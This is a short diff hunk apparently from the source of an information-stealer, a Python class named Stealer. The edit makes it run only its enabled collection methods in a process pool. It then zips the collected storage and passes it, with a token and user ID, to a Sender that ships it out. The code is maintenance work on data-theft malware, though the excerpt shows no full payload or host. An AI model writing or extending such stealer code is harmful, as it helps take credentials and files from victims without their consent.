@@ -158,7 +158,7 @@ class Stealer(Thread):
             self.__create_storage()
 
             with Pool(processes=self.config.PoolSize) as pool:
-                pool.map(functions.run_process, [method["object"] for method in self.methods])
+                pool.map(functions.run_process, [method["object"] for method in self.methods if method["status"] is True])
 
             Sender(self.config.ZipName, self.config.StoragePath, self.token, self.user_id, self.errors).run()
 
